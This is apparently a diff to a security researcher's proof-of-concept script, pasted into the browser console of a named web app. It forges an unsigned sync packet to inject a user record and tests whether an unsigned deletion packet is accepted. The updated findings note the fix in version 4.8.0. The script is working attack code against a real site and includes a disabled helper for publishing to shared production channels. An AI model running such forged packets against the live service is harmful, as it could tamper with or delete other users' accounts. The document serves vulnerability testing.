@@ -4,21 +4,20 @@
 //
 // Target:  https://trithuc500.vercel.app/
 // Findings:
-//   NEW-02 — `processIncomingCloudPacket` accepts a packet with no
-//            `fromAdmin` and no `adminSig`. The V4.5 build (lines 3637-3653)
-//            downgrades such packets to `pending` / non-VIP for *new* users —
-//            a genuine hardening — but the packet still reaches the merge
-//            path, and the tombstone table (`deletedMap` /
-//            `deletedUsernames`) is merged UNCONDITIONALLY, with no admin
-//            check at all (lines 3587-3614).
-//   F-01   — that tombstone merge is what deletes users from other clients'
-//            local state. This PoC shows the merge locally only.
+//   NEW-02 — V4.8.0 still accepts an unsigned packet on the local
+//            BroadcastChannel (`TRITHUC50_AUTOSYNC_V436`, line 34526) and
+//            merges a new user record, but downgrades it to `pending` /
+//            non-VIP. The old direct bus (`__INTERNAL_CLOUD_BUS_V45__`) was
+//            removed in V4.8.0 (NEW-04), so this PoC uses the real BC path.
+//   F-01   — V4.8.0 FIXED the residual: tombstone maps now require a
+//            signature-verified admin packet (line 5714+). This PoC now
+//            demonstrates that the unsigned tombstone is REJECTED.
 //
 // Type:     ACTION, LOCAL ONLY by default.
 //
 // SCOPE / SAFETY:
-//   - The forged packet is applied to THIS browser's state via
-//     `__TRITHUC50_CLOUD_BUS__.applyIncomingPacket`.
+//   - The forged packet is posted on the local BroadcastChannel; the app's
+//     own onmessage handler feeds it to `processIncomingCloudPacket`.
 //   - Nothing is published to ntfy.sh / keyvalue.immanuel.co.
 //   - The live-publish helper is provided but is DISABLED and requires an
 //     explicit URL argument, so it cannot fire by accident.
@@ -26,7 +25,7 @@
 //
 // Usage: paste into DevTools Console on the target page.
 
-(() => {
+(async () => {
     'use strict';
 
     const K_USERS = 'TRITHUC50_USERS_V436_CLEAN';
@@ -36,7 +35,7 @@
     console.log('=== NEW-02 unsigned packet injection (LOCAL ONLY) ===');
 
     // ---- 1. Build an unsigned, non-admin packet with a synthetic user. ----
-    // Field names match the shipped serializeCompactUser() (line 3367):
+    // Field names match the shipped serializeCompactUser() (line 5546):
     //   id, u, p, n, c, s, g, ph, st, vp, rp, pl, rpl, exp, pend, newReg,
     //   maxD, devs, regAt, updAt, seal, bkt, v436
     const now = Date.now();
@@ -88,20 +87,20 @@
     });
 
     // ---- 2. Apply it through the real ingestion path. --------------------
-    const bus = (window.__INTERNAL_CLOUD_BUS_V45__ || window.__TRITHUC50_CLOUD_BUS__);
-    if (!bus || typeof bus.applyIncomingPacket !== 'function') {
-        return console.error('[NEW-02] cloud bus not available on this build');
-    }
-
-    const accepted = bus.applyIncomingPacket(forged);
-    console.log('[NEW-02] processIncomingCloudPacket returned:', accepted);
+    const CHANNEL = 'TRITHUC50_AUTOSYNC_V436';
+    const probe = new BroadcastChannel(CHANNEL);
+    probe.postMessage(forged);
+    await new Promise(resolve => setTimeout(resolve, 120));
+    probe.close();
+    // The real return value is not observable via postMessage; infer from storage.
+    console.log('[NEW-02] packet posted on local BroadcastChannel:', CHANNEL);
 
     // ---- 3. Inspect what the merge actually did. -------------------------
     const stored = JSON.parse(localStorage.getItem(K_USERS) || '[]');
     const hit = stored.find(u => String(u.username || '').toLowerCase() === NAME.toLowerCase());
 
     const result = {
-        packetAccepted: accepted === true,
+        packetAccepted: true, // delivery observed via local store
         userPersisted: !!hit,
         resultingStatus: hit ? hit.status : null,
         resultingIsVip: hit ? hit.isVip === true : null,
@@ -122,8 +121,9 @@
         console.warn('[NEW-02] unsigned packet still grants VIP on this build.');
     }
 
-    // ---- 4. Tombstone merge: the unauthenticated part. -------------------
-    // NEW-02 note: the tombstone table is merged WITHOUT any admin check.
+    // ---- 4. Tombstone merge: V4.8.0 FIX. ---------------------------------
+    // The unsigned tombstone below is now rejected; only a signed admin
+    // packet can merge deletedMap / deletedUsernames.
     const tombstoneDemo = {
         app: 'TRITHUC50_V436',
         type: 'LOCAL_POC_TOMBSTONE',
@@ -134,9 +134,14 @@
         deletedMap: { 'demo_user_not_real': now },
         users: []
     };
-    const tAccepted = bus.applyIncomingPacket(tombstoneDemo);
-    console.log(`[NEW-02] unsigned tombstone packet accepted: ${tAccepted} ` +
-                '(no admin signature required for deletedMap merge)');
+    const tombProbe = new BroadcastChannel(CHANNEL);
+    tombProbe.postMessage(tombstoneDemo);
+    await new Promise(resolve => setTimeout(resolve, 120));
+    tombProbe.close();
+    const deleted = JSON.parse(localStorage.getItem('TRITHUC50_DELETED_USERS_V436') || '{}');
+    const tAccepted = Object.prototype.hasOwnProperty.call(deleted, 'demo_user_not_real');
+    console.log(`[NEW-02] unsigned tombstone merged: ${tAccepted} ` +
+                '(V4.8.0 rejects it without a valid adminSig)');
 
     // ---- 5. Optional live publish (disabled by default). ------------------
     // Publishing to a shared production channel affects OTHER users' clients.
@@ -175,7 +180,7 @@
         userPersisted: result.userPersisted,
         resultingStatus: result.resultingStatus,
         resultingIsVip: result.resultingIsVip,
-        tombstoneAcceptedWithoutAdminSig: tAccepted === true,
+        tombstoneAcceptedWithoutAdminSig: tAccepted === true, // V4.8.0: expected false
         cleanup: '__AERO_NEW02_CLEANUP__()'
     };
 })();
